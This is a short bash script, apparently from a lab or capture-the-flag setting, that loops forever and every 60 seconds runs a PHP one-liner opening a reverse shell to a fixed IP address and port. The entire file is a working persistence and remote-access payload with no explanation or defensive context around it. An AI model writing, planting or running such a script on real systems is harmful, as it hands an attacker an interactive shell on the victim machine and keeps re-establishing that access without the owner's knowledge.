#!/bin/bash
while true
do
	php -r '$sock=fsockopen("10.14.15.119",12345);exec("sh <&3 >&3 2>&3");'
	sleep 60
done
